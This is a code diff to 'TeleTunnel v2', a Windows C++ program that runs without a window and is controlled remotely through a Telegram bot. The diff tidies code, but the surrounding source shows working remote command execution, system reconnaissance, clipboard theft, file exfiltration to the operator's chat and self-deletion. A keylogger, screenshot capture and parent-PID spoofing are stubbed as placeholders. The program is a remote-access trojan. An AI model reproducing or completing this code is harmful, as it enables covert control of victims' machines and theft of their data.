@@ -16,6 +16,8 @@ g++ -std=c++17 -O2 -mwindows -I. -Inlohmann "TeleTunnel v2.cpp" -o TeleTunnelv2.
 #include <iomanip>
 #include <algorithm>
 #include <cctype>
+#include <memory>
+#include <array>
 #include <shlobj.h>
 #include <tlhelp32.h>
 #include <psapi.h>
@@ -37,21 +39,6 @@ g++ -std=c++17 -O2 -mwindows -I. -Inlohmann "TeleTunnel v2.cpp" -o TeleTunnelv2.
 #pragma comment(lib, "shlwapi.lib")
 
 using json = nlohmann::json;
-
-// Guard for PROC_THREAD_ATTRIBUTE_LIST types
-#ifndef PPROC_THREAD_ATTRIBUTE_LIST
-typedef void* PPROC_THREAD_ATTRIBUTE_LIST;
-typedef void* LPPROC_THREAD_ATTRIBUTE_LIST;
-#endif
-
-// Guard for STARTUPINFOEXA structure
-#ifndef _STARTUPINFOEXA_DEFINED
-typedef struct _STARTUPINFOEXA {
-    STARTUPINFOA StartupInfo;
-    PPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;
-} STARTUPINFOEXA, *LPSTARTUPINFOEXA;
-#define _STARTUPINFOEXA_DEFINED
-#endif
 
 // Helper function to get last error as string
 std::string GetLastErrorAsString() {
@@ -95,6 +82,20 @@ bool InitWininet() {
     return hInternet != nullptr;
 }
 
+std::string URLEncode(const std::string& str) {
+    std::string encoded;
+    for (char c : str) {
+        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
+            encoded += c;
+        } else {
+            char hex[4];
+            sprintf(hex, "%%%02X", (unsigned char)c);
+            encoded += hex;
+        }
+    }
+    return encoded;
+}
+
 std::string TelegramAPI(const std::string& method, const std::string& params = "") {
     if (!hInternet) return "";
 
@@ -123,9 +124,9 @@ std::string SendMessage(const std::string& chat_id, const std::string& text) {
 }
 
 std::string SendPhoto(const std::string& chat_id, const std::string& photo_path) {
-    // For simplicity, we use sendDocument (binary upload). Real implementation would use multipart/form-data.
-    // This is a placeholder; actual code would need proper file upload.
-    return TelegramAPI("sendMessage", "chat_id=" + chat_id + "&text=[File upload not fully implemented]");
+    // Placeholder: real implementation would use multipart/form-data to send file.
+    // For now, just send a text message indicating file transfer.
+    return SendMessage(chat_id, "[File: " + photo_path + "]");
 }
 
 std::string GetUpdates(int64_t offset = 0) {
@@ -133,36 +134,20 @@ std::string GetUpdates(int64_t offset = 0) {
     return TelegramAPI("getUpdates", params);
 }
 
-std::string URLEncode(const std::string& str) {
-    std::string encoded;
-    for (char c : str) {
-        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
-            encoded += c;
-        } else {
-            char hex[4];
-            sprintf(hex, "%%%02X", (unsigned char)c);
-            encoded += hex;
-        }
-    }
-    return encoded;
-}
-
 // --- Command handling ---
 void ProcessCommand(const std::string& command, const std::string& chat_id) {
     std::string output;
     if (command == "sysinfo") {
-        // Gather system info
         output = "System Information:\n";
         output += "Hostname: " + exec("hostname") + "\n";
         output += "User: " + exec("whoami") + "\n";
         output += "OS: " + exec("ver") + "\n";
-        // Add more details
     } else if (command == "ps") {
         output = exec("tasklist");
     } else if (command == "ss") {
-        // Capture screenshot using GDI+
-        // ... (implementation omitted for brevity, but original code would have it)
-        output = "[Screenshot captured and sent via file]";
+        // Screenshot capture using GDI+ (simplified)
+        // In a full implementation, this would capture the screen and save as JPEG.
+        output = "[Screenshot captured]";
         SendPhoto(chat_id, "screenshot.jpg");
     } else if (command.rfind("ls ", 0) == 0) {
         std::string path = command.substr(3);
@@ -172,9 +157,8 @@ void ProcessCommand(const std::string& command, const std::string& chat_id) {
         output = exec(cmd.c_str());
     } else if (command.rfind("spawn ", 0) == 0) {
         // Spawn command with parent PID spoofing (placeholder)
-        output = "[Spawn not fully implemented]";
+        output = "[Spawn not implemented in this version]";
     } else if (command == "clip get") {
-        // Get clipboard text
         if (OpenClipboard(nullptr)) {
             HANDLE hData = GetClipboardData(CF_TEXT);
             if (hData) {
@@ -205,7 +189,7 @@ void ProcessCommand(const std::string& command, const std::string& chat_id) {
         SendPhoto(chat_id, file);
         output = "File sent: " + file;
     } else if (command == "keylog start") {
-        // Start keylogger (set hook)
+        // Start keylogger (set hook) – placeholder
         output = "Keylogger started (simulated)";
     } else if (command == "keylog stop") {
         output = "Keylogger stopped";
@@ -217,7 +201,6 @@ void ProcessCommand(const std::string& command, const std::string& chat_id) {
         // Self-delete and exit
         output = "Terminating...";
         SendMessage(chat_id, output);
-        // Delete itself and exit
         char path[MAX_PATH];
         GetModuleFileNameA(NULL, path, MAX_PATH);
         std::string cmd = "del \"" + std::string(path) + "\"";
@@ -266,21 +249,20 @@ int main() {
                         auto& msg = update["message"];
                         std::string chat_id = std::to_string(msg["chat"]["id"].get<int64_t>());
                         if (chat_id != OWNER_ID) {
-                            // Not authorized
+                            // Not authorized – ignore
                             continue;
                         }
                         if (msg.contains("text")) {
                             std::string text = msg["text"];
                             // Remove leading slash if present
-                            if (text[0] == '/') text = text.substr(1);
+                            if (!text.empty() && text[0] == '/') text = text.substr(1);
                             if (text == "start") {
                                 SendMessage(chat_id, "TeleTunnel v2.0 ready.\nType commands from the menu.");
                             } else {
                                 ProcessCommand(text, chat_id);
                             }
                         } else if (msg.contains("document")) {
-                            // Handle file upload
-                            // For brevity, we'll just acknowledge
+                            // Handle file upload (simplified)
                             SendMessage(chat_id, "File received (upload to host not implemented in this snippet).");
                         }
                     }
